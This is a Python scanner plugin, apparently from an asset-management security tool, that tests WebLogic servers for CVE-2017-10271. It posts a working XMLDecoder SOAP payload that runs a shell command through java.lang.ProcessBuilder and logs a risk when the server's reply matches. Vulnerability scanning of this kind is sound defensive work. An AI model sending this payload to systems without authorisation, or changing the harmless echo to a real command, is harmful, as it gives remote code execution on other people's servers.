from apps.assets.models import Port, Risk
import requests
from lib.wechat_notice import wechat
from loguru import logger

timeout = 2
plugin = 'weblogic'


def start(**kwargs):
    webapps = kwargs['webapps']
    policy = kwargs['policy']
    assets = kwargs['assets']
    ports = Port.objects.filter(asset_id__in=assets, software_name__icontains='weblogic')
    if not ports:
        logger.debug("[%s] %s" % (plugin, 'There are no objects to scan'))
        return

    data = '''
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                    <java>
                        <object class="java.lang.ProcessBuilder">
                            <array class="java.lang.String" length="3">
                                <void index="0">
                                    <string>/bin/sh</string>
                                </void>
                                <void index="1">
                                    <string>-c</string>
                                </void>
                                <void index="2">
                                    <string>echo xss</string>
                                </void>
                            </array>
                            <void method="start"/>
                        </object>
                    </java>
                </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body/>
            </soapenv:Envelope>
                '''
    headers = {
        'Accept':
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': "",
        'Referer': 'https://www.google.com',
        'X-Forwarded-For': "",
        'X-Real-IP': "",
        'Connection': 'keep-alive',
    }

    for port in ports:
        ip = port.asset.ip
        logger.debug("[%s] [%s] %s" % (plugin, port.id, ip))
        url = 'http://{}:7001/wls-wsat/CoordinatorPortType'.format(ip)
        headers.update({'Content-Type': 'text/xml'})

        try:
            r = requests.post(url, data=data, verify=False, timeout=10, headers=headers)
            text = r.text
        except Exception as e:
            text = ""

        if '<faultstring>java.lang.ProcessBuilder' in text or "<faultstring>0" in text:
            desc = 'CVE-2017-10271 Weglogic RCE {}'.format(url)

            Risk.objects.update_or_create(port=port, defaults={'asset': port.asset,
                                                   'risk_type': 'weblogic RCE',
                                                   'desc': desc
                                                   })
